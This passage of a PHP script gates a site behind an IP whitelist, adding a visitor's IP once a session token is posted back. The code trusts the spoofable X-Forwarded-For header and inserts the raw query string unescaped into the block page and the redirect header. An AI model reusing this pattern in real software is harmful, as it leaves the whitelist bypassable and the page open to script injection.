<title>&#x53;&#x69;&#x67;&#x6e;&#x20;&#x69;&#x6e;&#x20;&#x50;&#x72;&#x6f;&#x74;&#x65;&#x63;&#x74;&#x69;&#x6f;&#x6e;</title>
<meta charset="UTF-8" />
</head>
<body>
  ';
    return $page_header;
}

/**
 * Get html footer
 */
function _get_footer()
{
    $page_footer = '

</body>
</html>';
    return $page_footer;
}

/**
 * Try to get current IP from current request
 */
function getRealIP()
{
    $client_ip = (!empty($_SERVER['REMOTE_ADDR'])) ? $_SERVER['REMOTE_ADDR'] : ((!empty($_ENV['REMOTE_ADDR'])) ? $_ENV['REMOTE_ADDR'] : "unknown");
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $entries = mb_split('[, ]', $_SERVER['HTTP_X_FORWARDED_FOR']);
        reset($entries);
         foreach ($entries as $entry){
            $entry = trim($entry);
            if (preg_match("/^([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)/", $entry, $ip_list)) { // http://www.faqs.org/rfcs/rfc1918.html
                $private_ip = array(
                    '/^0\./',
                    '/^127\.0\.0\.1/',
                    '/^192\.168\..*/',
                    '/^172\.((1[6-9])|(2[0-9])|(3[0-1]))\..*/',
                    '/^10\..*/'
                );
                $found_ip   = preg_replace($private_ip, $client_ip, $ip_list[1]);
                if ($client_ip != $found_ip) {
                    $client_ip = $found_ip;
                    break;
                }
            }
        }
    }
    return $client_ip;
}

/**
 * Get protected script name
 */
function curPageName()
{
    return substr($_SERVER["SCRIPT_NAME"], strrpos($_SERVER["SCRIPT_NAME"], "/") + 1);
}

/**
 * Get url path of protected script name
 */
function curPathURL()
{
    $pageURL = 'http';
    if (array_key_exists('HTTPS', $_SERVER) && $_SERVER["HTTPS"] == "on") {
        $pageURL .= "s";
    }
    $pageURL .= "://";
    if ($_SERVER["SERVER_PORT"] != "80") {
        $pageURL .= $_SERVER["SERVER_NAME"] . ":" . $_SERVER["SERVER_PORT"];
    } else {
        $pageURL .= $_SERVER["SERVER_NAME"];
    }
    $parts = explode('/', $_SERVER['REQUEST_URI']);
    for ($i = 0; $i < count($parts) - 1; $i++) {
        $pageURL .= $parts[$i] . "/";
    }
    return $pageURL;
}

/**
 * Block access
 */
function blocked($get_msg, $langcode, $lang_output, $actionname)
{
    $data    = array(
        'lang_output' => $lang_output,
        'curPageName' => curPageName(),
        'actionname' => $actionname,
        'query_string' => $_SERVER['QUERY_STRING']
    );
    $content = replace_vars($get_msg[$langcode], $data);
    header("HTTP/1.0 404 Not Found");
    die(_get_header() . $content . _get_footer());
}

/**
 * Replace {vars} in translations
 */
function replace_vars($buffer, $data)
{
    /* replace declared var names */
    foreach ($data as $k => $v) {
        if (is_string($v) || is_numeric($v) || $v == NULL) {
            $buffer = preg_replace('/\{' . strtolower($k) . '\}/', $v, $buffer);
        }
    }
    return $buffer;
}

/** END FUNCTIONS ****/

/**
 * Vars
 */
$requester_IP = getRealIP(); // current requester IP
$wl_filename  = dirname(__FILE__) . '/' . $wl; // set full path whitelist file


/* Check actionname */
if (isset($_SESSION['actionname']) AND isset($_POST['actionname'])) {
    
    if ($_SESSION['actionname'] == $_POST['actionname']) {
        
        /* Add IP to whitelist */
        $fh = fopen($wl_filename, 'a');
        fwrite($fh, $requester_IP . "\n");
        fclose($fh);
        
        /* Destroy current session */
        $_SESSION = array(); // destroys sesion parameters
        $_COOKIE  = array(); // destroys cookies parameters
        session_destroy();
        
        /* Redirects to protected script */
        if (!empty($_POST['query_string'])) {
            header('Location: ' . curPathURL() . curPageName() . '?' . $_POST['query_string']);
        } else {
            header('Location: ' . curPathURL() . curPageName());
        }
        die();
        
    } else {
        
        /* Get current actionname session */
        $actionname = $_SESSION['actionname'];
        
    }
    
} else {
    
    /* Create new actionname session */
    $actionname             = '.ht_' . uniqid();
    $_SESSION['actionname'] = $actionname;
    
}

/* Check whitelist */
if (is_file($wl_filename)) {
    $whitelist = file($wl_filename, FILE_IGNORE_NEW_LINES);
    
    /* is IP in whitelist? */
    if (!in_array($requester_IP, $whitelist)) {
        blocked($get_msg, $langcode, $lang_output, $actionname);
    }
    
} else {
    
    /* Empty whitelist */
    blocked($get_msg, $langcode, $lang_output, $actionname);
    
}
// Lets continue loading protected script
?>
